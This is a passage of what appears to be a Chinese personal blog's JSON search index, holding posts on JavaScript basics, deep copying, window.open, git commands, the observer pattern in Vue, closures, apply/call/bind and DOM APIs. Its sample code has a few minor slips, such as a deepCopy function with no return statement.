obj;\nconsole.log(myName, myFood);\n// 'Joe' 'cake'\n```\n在下面的示例中，解构被用来将 person 对象传给 introduce 函数。换句话说，解构可以（并且经常）直接用于提取传给函数的参数。如果你熟悉 React，可能已经见过这个！\n```js\nconst person = {\n  name: 'Eddie',\n  age: 24\n}\nfunction introduce({ name, age }) {\n  console.log(`I'm ${name} and I'm ${age} years old!`);\n}\nconsole.log(introduce(person));\n// \"I'm Eddie and I'm 24 years old!\"\n```\n\n## 4. 展开（spread）语法\n在下面的示例中，Math.max 不能直接接受 arr 数组，因为它的参数不是数组类型，但可以以数组中的各个元素作为参数。展开运算符... 可用于提取数组的各个元素。\n```js\nconst arr = [4, 6, -1, 3, 10, 4];\nconst max = Math.max(...arr);\nconsole.log(max);\n// 10\n```\n\n## 5. 变长参数（rest）语法\n你可以用它将传给函数的任意数量的参数放入数组中！\n```js\nfunction myFunc(...args) {\n  console.log(args[0] + args[1]);\n}\nmyFunc(1, 2, 3, 4);\n// 3\n```\n\n## 6. 数组方法\nJavaScript 数组方法通常可以为你提供令人难以置信的优雅方式来执行所需的数据转换。作为 StackOverflow 的贡献者，我经常看到有关如何以这种或那种方式操纵对象数组的问题。这往往是数组方法的完美用例。\n\n### map、filter、reduce\n\nmap：返回一个数组，其中每个元素都使用指定函数进行过转换。\n```js\nconst arr = [1, 2, 3, 4, 5, 6];\nconst mapped = arr.map(el => el + 20);\nconsole.log(mapped);\n// [21, 22, 23, 24, 25, 26]\n```\n\nfilter：返回一个数组，只有当指定函数返回 true 时，相应的元素才会被包含在这个数组中。\n```js\nconst arr = [1, 2, 3, 4, 5, 6];\nconst filtered = arr.filter(el => el === 2 || el === 4);\nconsole.log(filtered);\n// [2, 4]\n```\n\nreduce：基于给定函数累加值。\n```js\nconst arr = [1, 2, 3, 4, 5, 6];\nconst reduced = arr.reduce((total, current) => total + current);\nconsole.log(reduced);\n// 21\n```\n### find、findIndex、indexOf\nfind：返回与指定条件匹配的第一个实例，不会继续查找其他匹配的实例。\n```js\nconst arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];\nconst found = arr.find(el => el > 5);\nconsole.log(found);\n// 6\n```\n虽然 5 之后的元素都符合条件，但只返回第一个匹配的元素。\n\nfindIndex：这与 find 几乎完全相同，但不返回第一个匹配的元素，而是返回第一个匹配元素的索引。\n```js\nconst arr = ['Nick', 'Frank', 'Joe', 'Frank'];\nconst foundIndex = arr.findIndex(el => el === 'Frank');\nconsole.log(foundIndex);\n// 1\n```\nindexOf：与 findIndex 几乎完全相同，但它的参数不是一个函数，而是一个简单的值。\n```js\nconst arr = ['Nick', 'Frank', 'Joe', 'Frank'];\nconst foundIndex = arr.indexOf('Frank');\nconsole.log(foundIndex);\n// 1\n```\n### push、pop、shift、unshift\npush：这是一个相对简单的方法，它将一个项添加到数组的末尾。它就地修改数组，函数本身会返回添加到数组中的项。\n```js\nlet arr = [1, 2, 3, 4];\nconst pushed = arr.push(5);\nconsole.log(arr);\n// [1, 2, 3, 4, 5]\nconsole.log(pushed);\n// 5\n```\npop：从数组中删除最后一项。同样，它也是就地修改数组。函数本身返回从数组中删除的项。\n```js\nlet arr = [1, 2, 3, 4];\nconst popped = arr.pop();\nconsole.log(arr);\n// [1, 2, 3]\nconsole.log(popped);\n// 4\n```\nshift：从数组中删除第一个项。同样，它也是就地修改数组。函数本身返回从数组中删除的项。\n```js\nlet arr = [1, 2, 3, 4];\nconst shifted = arr.shift();\nconsole.log(arr);\n// [2, 3, 4]\nconsole.log(shifted);\n// 1\n```\nunshift：将一个或多个元素添加到数组的开头。同样，它也是就地修改数组。与其他方法不同的是，函数本身返回数组最新的长度。\n```js\nlet arr = [1, 2, 3, 4];\nconst unshifted = arr.unshift(5, 6, 7);\nconsole.log(arr);\n// [5, 6, 7, 1, 2, 3, 4]\nconsole.log(unshifted);\n// 7\n```\n### splice、slice\nsplice：通过删除或替换现有元素或者添加新元素来修改数组的内容。这个方法也是就地修改数组。\n\n下面的代码示例的意思是：在数组的位置 1 上删除 0 个元素，并插入 b。\n```js\nlet arr = ['a', 'c', 'd', 'e'];\narr.splice(1, 0, 'b')\n```\nslice：从指定的起始位置和结束位置之前返回数组的浅拷贝。如果未指定结束位置，则返回数组的其余部分。这个方法不会修改数组，只是返回所需的子集。\n```js\nlet arr = ['a', 'b', 'c', 'd', 'e'];\nconst sliced = arr.slice(2, 4);\nconsole.log(sliced);\n// ['c', 'd']\nconsole.log(arr);\n// ['a', 'b', 'c', 'd', 'e']\n```\n### sort\nsort：根据提供的函数对数组进行排序。这个方法就地修改数组。如果函数返回负数或 0，则顺序保持不变。如果返回正数，则交换元素顺序。\n```js\nlet arr = [1, 7, 3, -1, 5, 7, 2];\nconst sorter = (firstEl, secondEl) => firstEl - secondEl;\narr.sort(sorter);\nconsole.log(arr);\n// [-1, 1, 2, 3, 5, 7, 7]\n```\n\n## 7. 生成器\n看到 * 不要害怕。生成器函数指定下一次调用 next() 时会生成什么 value。既可以生成有限数量的 value（最后调用 next() 会返回 undefined），也可以使用循环生成无限数量的 value。\n```js\nfunction* greeter() {\n  yield 'Hi';\n  yield 'How are you?';\n  yield 'Bye';\n}\nconst greet = greeter();\nconsole.log(greet.next().value);\n// 'Hi'\nconsole.log(greet.next().value);\n// 'How are you?'\nconsole.log(greet.next().value);\n// 'Bye'\nconsole.log(greet.next().value);\n// undefined\n```\n使用生成器生成无限个值：\n```js\nfunction* idCreator() {\n  let i = 0;\n  while (true)\n    yield i++;\n}\nconst ids = idCreator();\nconsole.log(ids.next().value);\n// 0\nconsole.log(ids.next().value);\n// 1\nconsole.log(ids.next().value);\n// 2\n// etc...\n```\n## 8. === 与 ==\n一定要知道 JavaScript 中 === 运算符和 == 运算符之间的区别！== 运算符在比较之前会进行类型转换，而 === 运算符在比较之前不会进行类型转换。\n```js\nconsole.log(0 == '0');\n// true\nconsole.log(0 === '0');\n// false\n```\n\n## 9. 对象比较\nJavaScript 新手容易犯的一个错误是直接比较对象。变量一般是指向内存中对象的引用，而不是对象本身！比较对象的一种方法是将它们转换成 JSON 字符串。但这样做有一个缺点：无法保证对象属性的顺序！一种更安全的方法是使用专门进行深度对象比较的库（例如 lodash 的 isEqual，https://lodash.com/docs#isEqual）。\n\n下面的对象看起来相同，但它们实际上指向不同的引用。\n```js\nconst joe1 = { name: 'Joe' };\nconst joe2 = { name: 'Joe' };\nconsole.log(joe1 === joe2);\n// false\n```\n相反，下面的结果为 true，因为使用其中一个对象为另一个对象赋值，它们都指向相同的引用（内存中只有一个对象）。\n```js\nconst joe1 = { name: 'Joe' };\nconst joe2 = joe1;\nconsole.log(joe1 === joe2);\n// true\n```\n## 10. 回调函数\n很多人都被 JavaScript 回调函数吓倒了！它们其实很简单，请看下面的例子。console.log 函数作为回调传给 myFunc，并在 setTimeout 完成时执行。\n```js\nfunction myFunc(text, callback) {\n  setTimeout(function() {\n    callback(text);\n  }, 2000);\n}\nmyFunc('Hello world!', console.log);\n// 'Hello world!'\n```\n## 11. promise\n一旦你理解了 JavaScript 回调，很快就会发现自己陷入了“回调地狱”中。这个时候可以使用 promise！将异步逻辑包装在 promise 中，使用“then”来处理成功的情况，使用“catch”来处理异常。\n```js\nconst myPromise = new Promise(function(res, rej) {\n  setTimeout(function(){\n    if (Math.random() < 0.9) {\n      return res('Hooray!');\n    }\n    return rej('Oh no!');\n  }, 1000);\n});\nmyPromise\n  .then(function(data) {\n    console.log('Success: ' + data);\n   })\n   .catch(function(err) {\n    console.log('Error: ' + err);\n   });\n\n// If Math.random() returns less than 0.9 the following is logged:\n// \"Success: Hooray!\"\n// If Math.random() returns 0.9 or greater the following is logged:\n// \"Error: On no!\"\n```\n## 12. Async/Await\n在掌握了 promise 的用法后，你可能也会喜欢 async await，它只是一种基于 promise 的“语法糖”。在下面的示例中，我们创建了一个 async 函数，并 await greeter promise。\n```js\nconst greeter = new Promise((res, rej) => {\n  setTimeout(() => res('Hello world!'), 2000);\n})\nasync function myFunc() {\n  const greeting = await greeter;\n  console.log(greeting);\n}\nmyFunc();\n// 'Hello world!'\n```\n\n# 参考\n[原文地址](https://mp.weixin.qq.com/s/lv55kP8MUboteMkV9basoQ)","tags":["JavaScript"],"categories":["其他"]},{"title":"对象的浅复制与深复制","url":"%2F2019-03-01-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%B5%85%E5%A4%8D%E5%88%B6%E4%B8%8E%E6%B7%B1%E5%A4%8D%E5%88%B6%2F","content":"\n# 前言\n\n虽然之前也知道浅复制是复制引用，深复制是新建一个对象，但是今天发现对于一些特殊类型还可以更高效的实现，因此整体梳理下作个备忘。\n\n# 概述\n\n之所以存在浅复制与深复制的概念，主要是因为变量在内存中的存放机制不同。\n基本类型直接放栈内存中，而引用类型是引用（指针）放在栈内存，主体数据放在堆内存中。对于堆栈内存的理解，可以简单类比为库房与前台店面，小东西可以直接店面展示（例如便利店），大物件只能放个模型对应具体哪一户（例如售楼处）。示例图如下：\n\n![堆栈内存示例图](1.jpg)\n\n<!-- more -->\n\n# 详述\n\n所谓浅复制与深复制主要针对引用类型，因为基本类型赋值就是值传递，而引用类型赋值是传递引用（指针）。我们可以把该对象的引用赋值给多个变量，他们指向同一个堆内存中的位置，只要其中一个改变了对象数据，其他的得到的也是变化后的，因为大家都指向一个堆内存中的数据。\n\n为了阻断这种影响，那么只能在堆内存中也复制一份，各自引用指向各自的堆数据。\n\n## 值不是 undefined,function,symbol 的对象\n\n```js\nfunction deepCopy(obj) {\n  return JSON.parse(JSON.stringify(obj));\n}\n// 示例\nlet a = [0, 1, [2, 3], 4],\n  b = deepCopy(a);\na[0] = 1;\na[2][0] = 1;\nconsole.log(a, b);\n```\n\n## 深拷贝\n\n```js\nfunction deepCopy(obj) {\n  var cloneObj = Array.isArray(obj) ? [] : {};\n  for (var key in obj) {\n    if (obj.hasOwnProperty(key)) {\n      if (typeof obj[key] == \"object\") {\n        // 递归\n        cloneObj[key] = deepCopy(obj[key]);\n      } else {\n        cloneObj[key] = obj[key];\n      }\n    }\n  }\n}\n```\n\n# 后记\n[图片来源](https://www.cnblogs.com/jingwhale/p/4884759.html)","tags":["JavaScript"],"categories":["前端"]},{"title":"window.location与window.open()","url":"%2F2019-02-15-window-location%E4%B8%8Ewindow-open%2F","content":"\n# 概述\n只对两者打开页面的常用场景作个总结，至于详细知识点可以看[JavaScript 高级程序设计 第 8 章](/2019/01/10/JS高设3版-8/)。\n<!-- more -->\n\n# 详述\n\n## 基本用法\n\n```js\nwindow.location.href = \"//www.sogou.com\";\nwindow.open(\"//www.sogou.com\");\n```\n\n前者是在当前窗口打开页面，浏览器历史记录中会生成一条记录，因此可以“后退”到前一个页面。\n后者是在新的窗口打开页面，有些浏览器默认会拦截，如图：\n![图一](1.gif)\n\n## 其他常用\n\n```js\nparent.location.href = \"//www.sogou.com\";\ntop.location.href = \"//www.sogou.com\";\n// 当前窗口打开\nwindow.open(\"//www.sogou.com\", \"_self\");\nwindow.open(\"//www.sogou.com\", \"_top\");\n```\n\n## window.open()屏蔽检测\n\n```js\nvar blocked = false;\ntry {\n  var wroxWin = window.open(\"//www.sogou.com\");\n  if (wroxWin == null) {\n    blocked = true;\n  }\n} catch (ex) {\n  blocked = true;\n}\nif (blocked) {\n  alert(\"The popup was blocked!\");\n}\n```\n\n# 后记\n","tags":["JavaScript"],"categories":["前端"]},{"title":"git常用命令","url":"%2F2019-02-11-git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F","content":"\n# 概述\n```bash\ngit remote add origin git@github.com:yourName/yourRepo.git\ngit pull origin master\ngit add .\ngit commit -m \"first commit\" \ngit push origin master  \n```\n<!-- more -->\n# 详述\n\n## 查看远程仓库\n```bash\ngit remote -v\n```\n## 删除远程仓库\n```bash\ngit remote rm [remote_name]\ngit remote rm origin\n```\n## 添加远程仓库\n```bash\ngit remote add [remote_name] git@github.com:yourName/yourRepo.git\ngit remote add origin git@github.com:jovysun/pipeImg.git\n```\n## 查看分支\n```bash\ngit branch -a\n```\n## 回退到上个版本\n```bash\ngit reset --hard HEAD^\n```\n#查看所有分支\n```bash\ngit branch -a\n```\n#切到dev分支\n```bash\ngit checkout dev\n```\n#切回master\n```bash\ngit checkout master\n```","tags":["工具"],"categories":["前端"]},{"title":"观察者模式--从事件绑定到Vue数据双向绑定","url":"%2F2019-02-01-%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F%2F","content":"# 概述\n\n观察者(observer) 模式，也叫自定义事件(custom events)，也叫订阅/发布(subscriber/publisher)模式。其实日常很多地方都在用，只是没有意识到或者没有提炼出’观察者模式‘这个概念。例如，下面实践回顾中说的场景，jQuery中的自定义事件，Vue中的双向绑定，nodejs中的eventEmitter等。\n\n<!-- more -->\n\n# 详述\n\n## 实践回顾\n\n总结这个的起因是，最初在做一个图片编辑的 UI 组件（pipeImg），一个使用场景是：`new PipeImg().show();`。问题在于，由于待编辑图片加载是异步的，需要图片 load 完成再调用 show 方法才有效。也就是先报名（订阅），然后等通知（发布）。这不正是我们说的订阅/发布模式（观察者模式）吗？\n\n示例代码\n\n```js\n...\n  methods: [],\n\n  show: function(params) {\n    this.methods.push({\n      name: \"show\",\n      params: params\n    });\n  },\n  exec: function() {\n    for (var i = 0; i < this.methods.length; i++) {\n      var element = this.methods[i];\n      this[\"_\" + element.name](element.params);\n    }\n    this.methods = [];\n  },\n  _show: function(){\n    // 真正的实现代码\n  },\n  init: function(){\n    var image = new Image();\n    image.src = 'xxxx';\n    image.onload = function(){\n      this.exec();\n    }\n  }\n...\n\n```\n\n看了实际的案例，接下来我们系统学习下这个模式，了解其中的设计思想，总结一个通用方法。\n## 如此简单\n```js\ndiv.addEventListener('click', function(){\n  alert('hello');\n})\n```\n这个就是？基本思想就是这样：先注册事件，然后等到具体事件触发时执行回调函数。下面我们再给出一例：\n\n## 自定义事件\n\n```js\nvar Event = {\n  // 处理函数储存器\n  handlers: {},\n  // 绑定\n  on: function(type, fn) {\n    if (!this.handlers[type]) {\n      this.handlers[type] = [];\n    }\n    this.handlers[type].push(fn);\n  },\n  // 触发\n  trigger: function(type) {\n    for (var i = 0; i < this.handlers[type].length; i++) {\n      this.handlers[type][i]();\n    }\n  },\n  // 解除\n  off: function(type, fn) {\n    for (var i = 0; i < this.handlers[type].length; i++) {\n      if (this.handlers[type][i] === fn) {\n        // 移除给定的fn\n        this.handlers[type].splice(i, 1);\n      } else {\n        // 移除所有type类型的\n        this.handlers[type].length = 0;\n      }\n    }\n  }\n};\n\n// 测试\nEvent.on(\"test\", function() {\n  console.log(\"test first\");\n});\nEvent.on(\"test\", function() {\n  console.log(\"test second\");\n});\nEvent.trigger(\"test\");\nEvent.off('test');\nEvent.trigger(\"test\");\n// test first\n// test second\n```\n似曾相识？没错，就是类似jQuery的自定义事件。下面再抽象一个通用的：\n\n## 发布/订阅\n```js\n// 摘自《JavaScript模式》\nvar publisher = {\n  subscribers: {\n    any: [] //event type: subscribers\n  },\n  subscribe: function(fn, type) {\n    type = type || \"any\";\n    if (typeof this.subscribers[type] === \"undefined\") {\n      this.subscribers[type] = [];\n    }\n    this.subscribers[type].push(fn);\n  },\n  unsubscribe: function(fn, type) {\n    this.visitSubscribers('unsubscribe', fn, type);\n  },\n  publish: function(publication, type) {\n    this.visitSubscribers('publish', publication, type);\n  },\n  visitSubscribers: function(action, arg, type){\n    var pubtype = type || 'any',\n        subscribers = this.subscribers[pubtype];\n    for(var i=0; i< subscribers.length; i++){\n      if(action === 'publish'){\n        subscribers[i](arg);\n      }else{\n        if(subscribers[i] === arg){\n            subscribers.splice(i,1);\n        }\n      }\n    }\n  }\n\n};\n//定义一个函数makePublisher()，它接受一个对象作为对象，通过把上述通用发布者的方法复制到该对象中，从而将其转换为一个发布者\nfunction makePublisher(obj) {\n  for (var i in publisher) {\n    if (publisher.hasOwnProperty(i) && typeof publisher[i] === \"function\") {\n      obj[i] = publisher[i];\n    }\n  }\n  obj.subscribers = {any: []};\n}\n\n//实现一个发布者paper对象\nvar paper = {\n    daily: function(){\n        this.publish(\"big news today\");\n    },\n    monthly: function(){\n        this.publish(\"interesting analysis\",\"monthly\");\n    }\n};\n//将paper构造成一个发布者\nmakePublisher(paper);\n//实现一个订阅这joe对象\nvar joe = {\n  drinkCoffee: function(publication){\n    console.log('Just read ' + publication);\n  },\n  sundayPreNap: function(publication){\n    console.log('About to fall asleep reading this ' + publication);\n  }\n};\n//paper注册joe（即joe向paper订阅）\npaper.subscribe(joe.drinkCoffee);\npaper.subscribe(joe.sundayPreNap, 'monthly');\n//即joe为默认“any”事件提供了一个可被调用的方法，而另一个可被调用的方法则用于当“monthly”类型的事件发生时的情况。现在让我们来触发一些事件：\npaper.daily();      //Just read big news today\npaper.daily();      //Just read big news today\npaper.monthly();    //About to fall asleep reading this interesting analysis\npaper.monthly();    //About to fall asleep reading this interesting analysis\npaper.monthly();    //About to fall asleep reading this interesting analysis\n```\n## Vue中的使用\n### 关于数据双向绑定的理解\n- view ==> data，通过绑定事件实现；\n- data ==> view，通过获取dom元素赋值实现；\n- data <=> view，以上两者结合；\n关于vue对该模块的实现，请看以下两张图：\n实现过程：\n![图一](2.png)\n观察者模式实现：\n![图二](1.png)\n实现的示例代码：\n```js\n    Object.defineProperty(data, key, {\n      enumerable: true,\n      configurable: true,\n      get: function() {\n        if (Dep.target) {\n          // 添加一个订阅者watcher\n          dep.addSub(Dep.target);\n        }\n        return value;\n      },\n      // setter，如果对一个对象属性值改变，就会触发setter中的dep.notify(),通知watcher（订阅者）数据变更，执行对应订阅者的更新函数，来更新视图。\n      set: function(newVal) {\n        if (value === newVal) {\n          return;\n        }\n        value = newVal;\n        // 新的值是object的话，进行监听\n        childObj = observe(value);\n        // 发布\n        dep.notify();\n      }\n    })\n\nfunction Dep() { // 消息订阅器Dep，订阅器Dep主要负责收集订阅者，然后再属性变化的时候执行对应订阅者的更新函数\n  this.subs = [];\n}\nDep.prototype = {\n  //添加订阅者\n  addSub: function(sub) { \n    this.subs.push(sub);\n  },\n  // 发布通知\n  notify: function() {\n    this.subs.forEach(function(sub) {\n      sub.update();\n    })\n  }\n}\n```\n结合注释及流程图，对于该模式在其中的应用就很好理解了：订阅器为Dep类，实现两个实例方法添加订阅者（addSub）和发布通知（notify），其中订阅者为Watcher实例，主要方法为update，该方法实现了data数据更新及调用更新view的方法。至于何时添加订阅者（addSub）和发布通知（notify），这个就看具体使用主体的需要了。\n\nvue中的实现，核心就是通过数据劫持（Object.defineProperty），该方法实现了对象属性读取时会调用get方法，赋值时会调用set方法。这样，在get中调用addSub，set中调用notify，也就实现了数据更新时发布通知，告诉订阅器watcher去完成相关更新工作update，这就完成了从data => view的自动更新。至于从view => data，熟悉的dom事件绑定，就如我们开头说的，事件绑定也是观察者模式。\n\n参考：\n图一相关：http://www.cnblogs.com/libin-1/p/6893712.html\n图二相关：https://blog.csdn.net/github_36369819/article/details/79201314","tags":["JavaScript"],"categories":["前端"]},{"title":"闭包--知识总结及实践","url":"%2F2019-02-01-%E9%97%AD%E5%8C%85%2F","content":"# 概述\n\n闭包是 JS 中一个很重要的概念，也是面试中时常被考察的部分。所谓闭包，就是函数中的函数，重点要理解作用域链问题。真是“请神容易送神难”，一旦请进了闭包，那么想结束这段关系，可就不是你包含函数说了算的，那要看被包含函数（闭包）的心情（姐说不玩了才能结束）。\n\n<!-- more -->\n\n# 详述\n\n## 闭包与变量\n\n_想包养可以，条件是咱们共享 wallet_\n\n```js\nfunction createFunctions() {\n  var result = new Array();\n  for (var w = 0; w < 10; w++) {\n    result[w] = function() {\n      return w;\n    };\n  }\n  return result;\n}\nvar fns = createFunctions();\nfns[2](); //10\n```\n\n_你们还是太年轻啊，叔我的策略是：定值 money_\n\n```js\nfunction createFunctions() {\n  var result = new Array();\n  for (var i = 0; i < 10; i++) {\n    result[i] = (function(num) {\n      return function() {\n        return num;\n      };\n    })(i);\n  }\n  return result;\n}\nvar fns = createFunctions();\nfns[2](); //2\n```\n\n## 关于 this 对象\n\n_我曾天真的以为，被包养就是拿别人的钱享受自己的人生_\n\n```js\nvar name = \"The Window\";\nvar object = {\n  name: \"My Object\",\n  getNameFunc: function() {\n    return function() {\n      return this.name;\n    };\n  }\n};\nalert(object.getNameFunc()()); //\"The Window\"（在非严格模式下）\n```\n\n_人老珠黄时才忽然明白，只有放到自己名下的才是自己的_\n\n```js\nvar name = \"The Window\";\nvar object = {\n  name: \"My Object\",\n  getNameFunc: function() {\n    var that = this;\n    return function() {\n      return that.name;\n    };\n  }\n};\nalert(object.getNameFunc()()); //\"My Object\"\n```\n\n## 实现`add(2)(3)`\n\n```js\nfunction add(a) {\n  return function(b) {\n    return a + b;\n  };\n}\nadd(2)(3);\n```\n## 循环中创建闭包问题\n```js\nvar btnList = document.getElementsByClassName(\"btn\");\nfor (var i = 0; i < btnList.length; i++) {\n  btnList[i].onclick = function() {\n    console.log(\"第\" + i + \"个按钮被点击到了\");\n  };\n}\n\n// 解决方法\nfor (var i = 0; i < btnList.length; i++) {\n  (function(j) {\n    btnList[j].onclick = function() {\n      console.log(\"第\" + j + \"个按钮被点击到了\");\n    };\n  })(i);\n}\n```\n## 对象排序\n```js\nvar arr = [{\n        id: 1,\n        name: 'Jack'\n    },\n    {\n        id: 3,\n        name: 'Tom'\n    },\n    {\n        id: 2,\n        name: 'Alax'\n    }\n];\n\nfunction createComparisonFunction(propertyName) {\n    return function(object1, object2) {\n        var value1 = object1[propertyName];\n        var value2 = object2[propertyName];\n        if (value1 < value2) {\n            return -1;\n        } else if (value1 > value2) {\n            return 1;\n        } else {\n            return 0;\n        }\n    };\n}\nconsole.log(arr.sort(createComparisonFunction('id')));\n```\n#后记","tags":["JavaScript"],"categories":["前端"]},{"title":"apply,call,bind--知识总结及实践案例","url":"%2F2019-01-31-apply-call-bind%2F","content":"# 前言\napply和call经常使用，今天突然看到bind方法，不熟悉，于是把三者整体梳理学习下。\n\n# 概述\n三者都是为了改变函数的作用域（上下文context），也就是改变函数中this的指向，同时可以附加参数。但是三者的具体使用有什么异同呢？\n\n<!-- more -->\n# 详述\n\n## 语法区别\n语法：\n```js\nfunc.apply(thisArg[, argsArray])\n\nfunc.call(thisArg[, arg1[, arg2[, ...]]])\ns\nvar otherFunc = func.bind(thisArg[, arg1[, arg2[, ...]]]);\notherFunc();\n```\n区别：\n1. apply与call类似，区别在于apply第二个参数是一个参数数组或者arguments对象，call从第二个参数开始，罗列一个个参数。（对于记忆，我的方法是apply+arguments，都是a开头，这样就不会混淆两者的传参形式了。）\n2. bind是创建一个新的函数，参数形式与call一样。\n3. apply/call与bind的区别是apply/call是在执行函数函数指定this指向，bind是先创建一个改变了this指向的新函数，然后再调用执行。\n\n## 使用场景\n### 检测数组\n\n```js\nif(Object.prototype.toString.call(obj) === '[object Array]'){\n  //执行数组操作\n}\n```\n当然，检测数组，同一个全局变量下可以用a`rr instanceof Array`，有框架结构就不行了，另外也可以用ES5的`Array.isArray(arr)`;\n\n### 类数组转成数组\n常用类数组对象有arguments,NodeList（包括类NodeList的元素集合）。\n```js\nArray.prototype.slice.call(arguments)\n```\n\n### 继承\n```js\nfunction SuperType(name) {\n  this.name = name;\n  this.colors = [\"red\", \"blue\", \"green\"];\n}\nSuperType.prototype.sayName = function() {\n  alert(this.name);\n};\nfunction SubType(name, age) {\n  //继承属性\n  SuperType.call(this, name);\n  this.age = age;\n}\n//继承方法\nSubType.prototype = new SuperType();\nSubType.prototype.constructor = SubType;\nSubType.prototype.sayAge = function() {\n  alert(this.age);\n};\n```\n### 事件绑定\n```js\nvar foo = {\n    bar : 1,\n    eventBind: function(){\n        $('.someClass').on('click',function(event) {\n            /* Act on the event */\n            console.log(this.bar);      //1\n        }.bind(this));\n    }\n}\n\n```\n### setTimeout\n```js\nfunction LateBloomer() {\n  this.petalCount = Math.ceil(Math.random() * 12) + 1;\n}\n\n// 在 1 秒钟后声明 bloom\nLateBloomer.prototype.bloom = function() {\n  setTimeout(this.declare.bind(this), 1000);\n};\n\nLateBloomer.prototype.declare = function() {\n  console.log('I am a beautiful flower with ' +\n    this.petalCount + ' petals!');\n};\n\nvar flower = new LateBloomer();\nflower.bloom();  // 一秒钟后, 调用'declare'方法\n```\n# 后记","tags":["JavaScript"],"categories":["前端"]},{"title":"DOM扩展（《JavaScript高级程序设计》）","url":"%2F2019-01-30-JS%E9%AB%98%E8%AE%BE3%E7%89%88-11%2F","content":"# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n重点掌握\n1. 选择符API\n`querySelector,querySelectorAll,matchesSelector`\n2. 元素遍历\n`childElementCount,firstElementChild,lastElementChild,previouseElementSibling,nextElementSibling`\n3. 其他\n`getElementsByClassName,classList,activeElement,hasFocus,readyState,compatMode,head,charset,innerHTML,innerText`\n\n<!-- more -->\n# 详述\n## 选择符 API\nquerySelector()方法接收一个 CSS 选择符，返回与该模式匹配的第一个元素，如果没有找到匹配的元素，返回 null。\n\nquerySelectorAll()方法接收的参数与 querySelector()方法一样，都是一个 CSS 选择符，但返回的是所有匹配的元素而不仅仅是一个元素。这个方法返回的是一个 类 NodeList 的实例，但是是快照非动态查询。\n\nSelectors API Level 2规范为Element类型新增了一个方法matchesSelector()。这个方法接收 一个参数，即 CSS 选择符，如果调用元素与该选择符匹配，返回 true;否则，返回 false。看例子。\n```js\nif (document.body.matchesSelector(\"body.page1\")){\n  //true\n}\n// 兼容写法\nfunction matchesSelector(element, selector){\n        if (element.matchesSelector){\n            return element.matchesSelector(selector);\n        } else if (element.msMatchesSelector){\n            return element.msMatchesSelector(selector);\n        } else if (element.mozMatchesSelector){\n            return element.mozMatchesSelector(selector);\n        } else if (element.webkitMatchesSelector){\n            return element.webkitMatchesSelector(selector);\n        } else {\n            throw new Error(\"Not supported.\");\n        }\n}\nif (matchesSelector(document.body, \"body.page1\")){ //执行操作\n}\n```\n\n\n\n## 元素遍历\nElement Traversal API 为 DOM 元素添加了以下 5 个属性。\n- childElementCount:返回子元素(不包括文本节点和注释)的个数。\n- firstElementChild:指向第一个子元素;firstChild 的元素版。\n- lastElementChild:指向最后一个子元素;lastChild 的元素版。\n- previousElementSibling:指向前一个同辈元素;previousSibling 的元素版。 \n- nextElementSibling:指向后一个同辈元素;nextSibling 的元素版。\n\n兼容性：IE 9+、Firefox 3.5+、Safari 4+、Chrome 和 Opera 10+\n\n## HTML5\n### getElementsByClassName()方法\ngetElementsByClassName()方法接收一个参数，即一个包含一或多个类名的字符串，返回带有 指定类的所有元素的 NodeList。传入多个类名时，类名的先后顺序不重要。注意，同样可能涉及性能问题。\n```js\n//取得所有类中包含\"username\"和\"current\"的元素，类名的先后顺序无所谓\nvar allCurrentUsernames = document.getElementsByClassName(\"username current\");\n```\n\n### classList 属性\n这个 classList 属性是新集合类型 DOMTokenList 的实例。与其他 DOM 集合类似，有length属性，每个元素可以用item()方法或者方括号语法访问。\n\n add(value):将给定的字符串值添加到列表中。如果值已经存在，就不添加了。\n contains(value):表示列表中是否存在给定的值，如果存在则返回 true，否则返回 false。 2  remove(value):从列表中删除给定的字符串。\n toggle(value):如果列表中已经存在给定的值，删除它;如果列表中没有给定的值，添加它。\n```js\n//删除\"disabled\"类 \ndiv.classList.remove(\"disabled\");\n//添加\"current\"类 \n div.classList.add(\"current\");\n//切换\"user\"类 \ndiv.classList.toggle(\"user\");\n//确定元素中是否包含既定的类名\nif (div.classList.contains(\"bd\") && !div.classList.contains(\"disabled\")){\n  //执行操作 \n)\n //迭代类名\nfor (var i=0, len=div.classList.length; i < len; i++){\n  doSomething(div.classList[i]);\n}\n```\n兼容性： Firefox 3.6+和 Chrome。\n\n### 焦点管理\ndocument.activeElement,document.hasFocus()\n\n```js\nvar button = document.getElementById(\"myButton\");\nbutton.focus();\nalert(document.activeElement === button);   //true\n\nvar button = document.getElementById(\"myButton\");\nbutton.focus();\nalert(document.hasFocus());  //true\n```\n兼容性：IE 4+、Firefox 3+、Safari 4+、Chrome 和 Opera 8+\n\n### HTMLDocument的变化\nreadyState 属性\nDocument 的 readyState 属性有两个可能的值:\n- loading，正在加载文档;\n- complete，已经加载完文档。\n```js\nif (document.readyState == \"complete\"){ \n  //执行操作\n}\n```\n兼容模式\n```js\nif (document.compatMode == \"CSS1Compat\"){\n        alert(\"Standards mode\");\n    } else {\n        alert(\"Quirks mode\");\n}\n```\nhead属性\n```js\nvar head = document.head || document.getElementsByTagName(\"head\")[0];\n```\n\n### 字符集属性\ncharset 和 defaultCharset\n```js\nalert(document.charset); //\"UTF-16\"\ndocument.charset = \"UTF-8\";\n```\n\n### 自定义数据属性\n以data-开头，用元素的dataset属性访问。\n```js\n<div id=\"myDiv\" data-appId=\"12345\" data-myname=\"Nicholas\"></div>\n\n//本例中使用的方法仅用于演示\nvar div = document.getElementById(\"myDiv\");\n//取得自定义属性的值\nvar appId = div.dataset.appId; var myName = div.dataset.myname;\n//设置值\ndiv.dataset.appId = 23456; div.dataset.myname = \"Michael\";\n//有没有\"myname\"值呢?\nif (div.dataset.myname){\n  alert(\"Hello, \" + div.dataset.myname);\n}\n```\n\n### 插入标记\n#### innerHTML 属性\n```js\ndiv.innerHTML = \"Hello world!\";\ndiv.innerHTML = \"Hello & welcome, <b>\\\"reader\\\"!</b>\";\n// 以上操作得到的结果如下:\n// <div id=\"content\">Hello &amp; welcome, <b>&quot;reader&quot;!</b></div>\n```\n不支持 innerHTML 的元素有:`<col>、<colgroup>、 <frameset>、<head>、<html>、<style>、<table>、<tbody>、<thead>、<tfoot>和<tr>`。\n\n无论什么时候，只要使用 innerHTML 从外部插入 HTML，都应该首先以可靠的方式处理 HTML。\n#### outerHTML 属性\n用法与innerHTML类似，只是包含调用元素。\n#### 